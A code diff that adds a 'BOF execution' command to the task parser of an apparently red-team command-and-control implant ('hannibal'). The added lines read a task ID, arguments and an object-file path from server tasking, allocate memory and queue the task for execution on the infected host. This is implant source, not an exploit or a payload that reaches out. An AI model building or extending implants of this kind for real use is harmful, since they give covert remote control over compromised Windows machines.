@@ -561,7 +561,9 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 #ifdef INCLUDE_CMD_EXECUTE_HBIN
         CMD_EXECUTE_HBIN *eh;
 #endif
-
+#ifdef INCLUDE_CMD_EXECUTE_BOF
+        CMD_EXECUTE_BOF *bof;
+#endif
 #ifdef INCLUDE_CMD_RM
         CMD_RM *rm;
 #endif
@@ -794,6 +796,39 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 
             break;
 #endif // INCLUDE_CMD_EXECUTE_HBIN
+#ifdef INCLUDE_CMD_EXECUTE_BOF
+        case CMD_EXECUTE_BOF_MESSAGE:
+            tlv_type = ReadUint8(&buffer);
+            if (tlv_type == TLV_CMD_ID) {
+                param1_uint32 = ReadUint32(&buffer);
+                task.task_uuid = ReadString(&buffer, param1_uint32); // Freed in post_tasks
+            }
+            tlv_type = ReadUint8(&buffer);
+            if (tlv_type == TLV_CMD_EXECUTE_BOF_ARGS) {
+                param1_uint32 = ReadUint32(&buffer);
+                param1_lpvoid = ReadBytes(&buffer, param1_uint32);
+            }
+            tlv_type = ReadUint8(&buffer);
+            if (tlv_type == TLV_CMD_EXECUTE_BOF_PATH) {
+                param2_uint32 = ReadUint32(&buffer);
+                param2_lpvoid = ReadBytes(&buffer, param2_uint32);
+            }
+
+            task.cmd_id = CMD_EXECUTE_BOF_MESSAGE;
+            task.cmd = (CMD_EXECUTE_BOF *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(CMD_EXECUTE_BOF), MEM_COMMIT, PAGE_READWRITE);
+            if (!task.cmd) {
+                return NULL;
+            }
+            bof = (CMD_EXECUTE_BOF *)task.cmd;
+            bof->args = param1_lpvoid;
+            bof->arg_size = param1_uint32;
+            bof->path_bof = param2_lpvoid;
+            bof->path_bof_size = param2_uint32;
+
+            task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);
+            
+            break;
+#endif // INCLUDE_CMD_EXECUTE_BOF
 #ifdef INCLUDE_CMD_RM
         case CMD_RM_MESSAGE:
            
